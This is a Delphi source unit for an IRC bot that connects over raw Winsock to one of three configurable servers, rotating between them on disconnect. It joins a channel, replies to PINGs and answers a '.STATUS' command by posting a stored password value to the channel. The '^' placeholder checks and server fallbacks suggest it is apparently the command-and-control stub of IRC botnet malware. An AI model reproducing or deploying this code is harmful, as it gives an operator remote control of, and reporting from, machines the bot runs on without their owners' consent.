   unit Unit1;

   interface
    USES
     WINDOWS, WINSOCK;

    VAR
     SOCK1:TSOCKET;
     SOCKINFO:SOCKADDR_IN;
     WSADATA4:TWSADATA;
     IRCSERV:STRING;
     IRCCHAN:STRING;
     IRCKEY:STRING;
     IRCNICK:STRING;
     IRCSERV2:STRING;
     IRCCHAN2:STRING;
     IRCKEY2:STRING;
     IRCNICK2:STRING;
     IRCSERV3:STRING;
     IRCCHAN3:STRING;
     IRCKEY3:STRING;
     IRCNICK3:STRING;
     MYPASS:STRING;
     IRC_MSG:STRING;
     BUFF:ARRAY[0..1024] OF CHAR;

     FUNCTION  GETIP(HOSTNAME:STRING) : STRING;
     FUNCTION  UPPERCASE(CONST S: STRING): STRING;
     PROCEDURE STARTUP(SERV: STRING);
     PROCEDURE READSOCK;
     PROCEDURE RAW(S:STRING);
     PROCEDURE IRCBOT;

   implementation

   FUNCTION getip(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData3    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData3);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   PROCEDURE RAW(S:STRING);
   BEGIN
    SEND(SOCK1,S[1],LENGTH(S),0);
   END;

   procedure Startup(SERV:STRING);
   var
    ab,nick:string;
    i,h:integer;
    begin
     ab := 'abcdefghijklmnopqrstuvwxyz';
     randomize;
     h:=random(10);
     for i:=h downto 0 do NICK:=NICK+copy(ab,random(length(ab)),1);
     WSAStartup(257,WSAData4);
     SockInfo.sin_family:=PF_INET;
     SockInfo.sin_port:=htons(6667);
     Nick := getip(SERV);
     SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip(SERV)));
     Sock1:= socket(PF_INET,SOCK_STREAM,0);
     Connect(Sock1,SockInfo,sizeof(SockInfo));
     RAW('USER '+NICK+' '+nick+'@hotmail.com 0 0'+#13#10);
     RAW('NICK '+IRCNICK+#13#10);
   end;

   Procedure ReadSock;
   VAR
    SEND01:STRING;
    ANSWER:STRING;
   begin
    ZeroMemory(@send01,sizeof(send01));
    send01 := buff;
    ZeroMemory(@buff,sizeof(buff));
   if pos('in use', send01)>0 then begin
    RAW('NICK '+IRCNICK2+#13#10);
    IRCNICK3 := IRCNICK;
    IRCNICK := IRCNICK2;
    IRCNICK2 := IRCNICK3;
   end else
   if pos('throttle', send01)>0 then begin
    SHUTDOWN(SOCK1,2);
    CLOSESOCKET(SOCK1);
    SLEEP(((60000)*10));
    EXIT;
   end else
   if pos('MOTD',uppercase(send01))>0 then begin
    RAW('JOIN '+IRCCHAN+#13#10);
   end else
   if pos('.STATUS',uppercase(send01))>0 then begin
   IF MYPASS <> '' THEN BEGIN
    IF MYPASS <> '^' THEN
     RAW('PRIVMSG '+IRCCHAN+' :'+IRC_MSG+' :'+MYPASS+#13#10);
   END ELSE
     RAW('PRIVMSG '+IRCCHAN+' :'+IRC_MSG+#13#10);
   end else
   if pos('PING',uppercase(send01))>0 then begin
    Answer := copy(send01,pos('PING',uppercase(send01))+6,length(send01));
    Answer := copy(answer,1,pos(#13#10,answer)-1);
    RAW('PONG :'+answer+#13#10);
   end;
   end;

   PROCEDURE IRCBOT;
   BEGIN
    STARTUP(IRCSERV);
    IF (IRCSERV  = '') AND
       (IRCSERV2 = '') AND
       (IRCSERV3 = '') THEN EXIT;
    IF (IRCSERV  = '^') AND
       (IRCSERV2 = '^') AND
       (IRCSERV3 = '^') THEN EXIT;
   WHILE 1<>2 DO BEGIN
    IF (RECV(SOCK1,BUFF,SIZEOF(BUFF),0))<1 THEN BEGIN
     IRCSERV3 := IRCSERV ;
     IRCCHAN3 := IRCCHAN ;
     IRCKEY3  := IRCKEY  ;
     IRCNICK3 := IRCNICK ;

     IRCSERV  := IRCSERV2;
     IRCCHAN  := IRCCHAN2;
     IRCKEY   := IRCKEY2 ;
     IRCNICK  := IRCNICK2;

     IRCSERV2 := IRCSERV3;
     IRCCHAN2 := IRCCHAN3;
     IRCKEY2  := IRCKEY3 ;
     IRCNICK2 := IRCNICK3;

    STARTUP(IRCSERV);
    IF (IRCSERV  = '') AND
       (IRCSERV2 = '') AND
       (IRCSERV3 = '') THEN EXIT;
    IF (IRCSERV  = '^') AND
       (IRCSERV2 = '^') AND
       (IRCSERV3 = '^') THEN EXIT;

    END ELSE BEGIN
     READSOCK;
    END;
   END;
   END;

   end.
